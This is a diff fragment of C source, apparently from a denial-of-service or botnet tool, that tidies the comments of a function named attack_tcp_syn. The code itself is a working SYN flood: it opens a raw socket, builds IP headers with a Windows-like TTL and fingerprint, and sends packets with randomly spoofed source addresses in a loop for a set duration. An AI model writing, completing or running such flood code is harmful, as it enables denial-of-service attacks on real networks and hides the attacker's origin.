@@ -19,10 +19,7 @@ struct pseudo_header {
     u_int16_t tcp_length;
 };
 
-// Advanced SYN Flood
-// - Uses Fast PRNG
-// - Mimics Windows 10/11 TCP Stack (Window Size, Options)
-// - Dynamic Spoofing
+// syn flood with win10/11 fingerprint
 void attack_tcp_syn(uint32_t ip, uint16_t port, uint32_t duration) {
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) return;
@@ -42,21 +39,18 @@ void attack_tcp_syn(uint32_t ip, uint16_t port, uint32_t duration) {
 
     time_t end_time = time(NULL) + duration;
 
-    // Pre-calculate minimal IP Header fields
     iph->ip_hl = 5;
     iph->ip_v = 4;
     iph->ip_tos = 0;
     iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + 20; // +20 bytes options (5 words)
     iph->ip_id = htonl(54321);
     iph->ip_off = 0;
-    iph->ip_ttl = 128; // Windows TTL
+    iph->ip_ttl = 128; // win ttl
     iph->ip_p = IPPROTO_TCP;
     iph->ip_dst.s_addr = ip;
 
     while (time(NULL) < end_time) {
-        // High-performance IP generation
-        // Bias towards public ranges? For now pure random.
-        iph->ip_src.s_addr = fast_rand(); 
+        iph->ip_src.s_addr = fast_rand(); // spoof 
         iph->ip_id = htonl(fast_rand() & 0xFFFF);
         iph->ip_sum = 0;
         iph->ip_sum = csum((unsigned short *)packet, iph->ip_len);
